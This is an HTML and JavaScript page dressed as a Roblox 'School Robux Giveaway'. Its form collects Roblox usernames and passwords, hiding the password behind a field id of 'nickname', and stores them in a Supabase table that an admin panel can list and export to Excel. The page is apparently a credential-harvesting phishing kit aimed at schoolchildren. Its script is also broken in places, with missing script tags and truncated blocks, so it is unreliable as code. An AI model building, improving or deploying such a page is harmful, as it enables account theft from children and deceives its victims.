<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>🎮 School Robux Giveaway</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="https://cdn.sheetjs.com/xlsx-0.20.1/package/dist/xlsx.full.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', 'Arial', sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      min-height: 100vh;
      padding: 15px;
    }

    .container {
      max-width: 450px;
      margin: 0 auto;
    }

    /* Roblox Header Style */
    .header {
      text-align: center;
      padding: 20px 0;
    }

    .roblox-logo {
      font-size: 36px;
      font-weight: 900;
      color: white;
      text-shadow: 2px 2px 0 #ff2e2e, 4px 4px 0 #00000030;
      letter-spacing: 2px;
      margin-bottom: 5px;
    }

    .subtitle {
      color: #b9bbbe;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 2px;
    }

    /* Main Card */
    .card {
      background: #232838;
      border-radius: 12px;
      padding: 25px 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      border: 1px solid #3a4055;
      margin-bottom: 20px;
    }

    /* Robux Badge */
    .robux-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      background: #00b06f;
      padding: 12px;
      border-radius: 50px;
      margin-bottom: 25px;
      box-shadow: 0 4px 0 #007a4d;
    }

    .robux-icon {
      width: 30px;
      height: 30px;
      background: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      color: #00b06f;
      font-size: 18px;
    }

    .robux-text {
      color: white;
      font-weight: bold;
      font-size: 22px;
      letter-spacing: 1px;
    }

    /* Form Styles */
    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      color: #b9bbbe;
      font-size: 13px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 8px;
    }

    .input-field {
      width: 100%;
      padding: 15px 16px;
      background: #1a1e2b;
      border: 2px solid #3a4055;
      border-radius: 8px;
      color: white;
      font-size: 16px;
      transition: all 0.3s;
    }

    .input-field:focus {
      outline: none;
      border-color: #00b06f;
      background: #1e2433;
    }

    .input-field::placeholder {
      color: #6c7180;
    }

    /* Submit Button */
    .submit-btn {
      width: 100%;
      padding: 16px;
      background: #00b06f;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 1px;
      cursor: pointer;
      box-shadow: 0 4px 0 #007a4d;
      transition: all 0.1s;
      margin-top: 10px;
    }

    .submit-btn:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #007a4d;
    }

    .submit-btn:disabled {
      background: #4a5568;
      box-shadow: 0 4px 0 #2d3748;
      transform: none;
      cursor: not-allowed;
    }

    /* Admin Section */
    .admin-section {
      background: #1a1e2b;
      border-radius: 12px;
      padding: 20px;
      border: 1px solid #3a4055;
    }

    .admin-title {
      color: #ff2e2e;
      font-size: 14px;
      font-weight: bold;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 15px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .admin-input {
      width: 100%;
      padding: 12px;
      background: #232838;
      border: 1px solid #3a4055;
      border-radius: 6px;
      color: white;
      margin-bottom: 10px;
    }

    .admin-btn {
      padding: 12px 16px;
      background: #ff2e2e;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      margin-right: 8px;
      margin-bottom: 8px;
      box-shadow: 0 3px 0 #c41e1e;
    }

    .admin-btn:active {
      transform: translateY(2px);
      box-shadow: 0 1px 0 #c41e1e;
    }

    .admin-btn.secondary {
      background: #4a5568;
      box-shadow: 0 3px 0 #2d3748;
    }

    .status-message {
      color: #00b06f;
      font-size: 14px;
      margin-top: 10px;
      min-height: 20px;
    }

    .error-message {
      color: #ff2e2e;
    }

    .submissions-table {
      width: 100%;
      margin-top: 15px;
      border-collapse: collapse;
      color: white;
      font-size: 13px;
      display: none;
    }

    .submissions-table th {
      text-align: left;
      padding: 10px 5px;
      border-bottom: 2px solid #3a4055;
      color: #b9bbbe;
    }

    .submissions-table td {
      padding: 8px 5px;
      border-bottom: 1px solid #2a2f40;
    }

    .stats {
      color: #00b06f;
      font-size: 14px;
      margin: 10px 0;
      display: none;
    }

    /* Loading Spinner */
    .spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid #ffffff30;
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-left: 8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Mobile Optimizations */
    @media (max-width: 400px) {
      .card { padding: 20px 15px; }
      .robux-text { font-size: 18px; }
      .admin-btn { width: 100%; margin-right: 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Header -->
    <div class="header">
      <div class="roblox-logo">ROBLOX</div>
      <div class="subtitle">School Giveaway Event</div>
    </div>

    <!-- Main Form Card -->
    <div class="card">
      <div class="robux-badge">
        <div class="robux-icon">R$</div>
        <div class="robux-text">250 ROBUX GIVEAWAY</div>
      </div>

      <form id="entryForm">
        <div class="form-group">
          <label> Roblox Username</label>
          <input 
            type="text" 
            id="username" 
            class="input-field" 
            placeholder="e.g., Builderman"
            required
          >
        </div>

        <div class="form-group">
          <label>Password</label>
          <input 
            type="text" 
            id="nickname" 
            class="input-field" 
            placeholder="What should we call you?"
            required
          >
        </div>

        <button type="submit" class="submit-btn" id="submitBtn">
          Submit
        </button>
      </form>

      <div id="formStatus" class="status-message"></div>
    </div>

    <!-- Admin Panel -->
    <div class="admin-section">
      <div class="admin-title">
        <span>🔐</span> ADMIN PANEL
      </div>

      <input 
        type="email" 
        id="adminEmail" 
        class="admin-input" 
        placeholder="Admin Email"
        value=""
      >
      <input 
        type="password" 
        id="adminPassword" 
        class="admin-input" 
        placeholder="Admin Password"
        value=""
      >

      <div>
        <button class="admin-btn" onclick="adminLogin()">LOGIN</button>
        <button class="admin-btn secondary" onclick="loadSubmissions()">VIEW ENTRIES</button>
        <button class="admin-btn secondary" onclick="exportToExcel()">📊 EXPORT EXCEL</button>
        <button class="admin-btn secondary" onclick="adminLogout()">LOGOUT</button>
      </div>

      <div id="adminStatus" class="status-message"></div>
      <div id="stats" class="stats"></div>
      <table class="submissions-table" id="submissionsTable">
        <thead>
          <tr>
            <th>Username</th>
            <th>Nickname</th>
            <th>Date</th>
          </tr>
        </thead>
        <tbody id="tableBody"></tbody>
      </table>
    </div>
  </div>

    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    document.getElementById('entryForm').addEventListener('submit', async (e) => {

      const username = document.getElementById('username').value.trim();
      const nickname = document.getElementById('nickname').value.trim();
      const submitBtn = document.getElementById('submitBtn');
      const statusDiv = document.getElementById('formStatus');
      
      // Basic validation
      if (!username || !nickname) {
        statusDiv.innerHTML = '<span class="error-message">❌ Please fill all fields</span>';
        return;
      }

      if (username.length < 3) {
        statusDiv.innerHTML = '<span class="error-message">❌ Username too short</span>';
        return;
      }

      // Show loading
      submitBtn.disabled = true;
      submitBtn.innerHTML = 'SUBMITTING... <span class="spinner"></span>';
      statusDiv.innerHTML = '';

      try {
        // Insert into Supabase
        const { data, error } = await supabase
          .from('submissions')
          .insert([
            { 
              roblox_username: username,
              roblox_nickname: nickname
            }
          ]);

        if (error) throw error;

        // Success
        statusDiv.innerHTML = '✅ Success! You\'ve been entered!';
        document.getElementById('username').value = '';
        document.getElementById('nickname').value = '';
        submitBtn.innerHTML = '✓ ENTERED!';
        
        setTimeout(() => {
          submitBtn.innerHTML = 'ENTER GIVEAWAY';
          statusDiv.innerHTML = '';

        submitBtn.innerHTML = 'ENTER GIVEAWAY';
      } finally {
        submitBtn.disabled = false;
      }
    });

    // Admin login function
    async function adminLogin() {
      const email = document.getElementById('adminEmail').value.trim();
      const password = document.getElementById('adminPassword').value.trim();
      const statusDiv = document.getElementById('adminStatus');

      if (!email || !password) {
        statusDiv.innerHTML = '<span class="error-message">❌ Enter email and password</span>';
        return;
      }

      statusDiv.innerHTML = 'Logging in... <span class="spinner"></span>';

      try {
        const { data, error } = await supabase.auth.signInWithPassword({
          email: email,
          password: password
        });

        if (error) throw error;

        statusDiv.innerHTML = '✅ Logged in successfully!';
        document.getElementById('adminEmail').value = '';
        document.getElementById('adminPassword').value = '';
        
      } catch (error) {
        statusDiv.innerHTML = `<span class="error-message">❌ Login failed: ${error.message}</span>`;
      }
    }

    // Load submissions (admin only)
    async function loadSubmissions() {
      const statusDiv = document.getElementById('adminStatus');
      const table = document.getElementById('submissionsTable');
      const stats = document.getElementById('stats');
      const tbody = document.getElementById('tableBody');

      // Check if logged in
      const { data: { session } } = await supabase.auth.getSession();
      
      if (!session) {
        statusDiv.innerHTML = '<span class="error-message">❌ Please login first</span>';
        return;
      }

      statusDiv.innerHTML = 'Loading entries... <span class="spinner"></span>';

      try {
        const { data, error, count } = await supabase
          .from('submissions')
          .select('*', { count: 'exact' })
          .order('created_at', { ascending: false });

        if (error) throw error;

        currentSubmissions = data;
        
        // Display stats
        stats.style.display = 'block';
        stats.innerHTML = `📋 Total Entries: ${count}`;
        
        // Build table
        tbody.innerHTML = '';
        data.forEach(entry => {
          const row = tbody.insertRow();
          const date = new Date(entry.created_at).toLocaleDateString('en-US', {
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
          });
          
          row.innerHTML = `
            <td>@${entry.roblox_username}</td>
            <td>${entry.roblox_nickname}</td>
            <td>${date}</td>
          `;
        });

        table.style.display = 'table';
        statusDiv.innerHTML = `✅ Loaded ${data.length} entries`;

      } catch (error) {
        statusDiv.innerHTML = `<span class="error-message">❌ Error: ${error.message}</span>`;
      }
    }
